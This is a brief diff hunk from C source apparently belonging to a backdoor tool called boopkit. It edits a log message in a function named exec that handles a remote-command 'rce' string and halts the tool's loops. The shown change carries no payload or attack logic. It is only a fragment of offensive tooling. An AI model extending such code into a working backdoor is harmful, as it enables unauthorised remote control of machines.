@@ -257,7 +257,7 @@ int exec(char *rce) {
   if (ret) {
     runtime__xcap    = 0; // Stop the xcap loop
     runtime__boopkit = 0; // Stop the boopkit loop
-    boopprintf("  XX Halting boopkit: %s\n", ret);
+    boopprintf("  XX Halting boopkit: %s\n", BOOPKIT_RCE_CMD_HALT);
     free(rce);
     return 0;
   }
